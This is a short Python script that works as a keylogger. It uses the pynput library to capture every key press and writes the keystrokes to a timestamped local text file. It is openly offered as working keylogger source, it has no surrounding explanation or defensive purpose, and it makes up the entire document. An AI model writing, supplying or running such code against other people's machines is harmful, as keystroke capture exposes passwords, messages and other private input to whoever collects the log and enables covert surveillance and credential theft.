import datetime
from pynput.keyboard import Listener

dt = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')

file_name = 'keylogger_{}.txt'.format(dt)

file = open(file_name, 'w')

def key_recorder(key):

    key = str(key)

    if key == 'Key.enter':
        file.write('\n')

    elif key == 'Key.space':
        file.write(' ')
    
    else:
        file.write(key.replace("'", ""))

with Listener(on_press=key_recorder) as l:
    l.join()
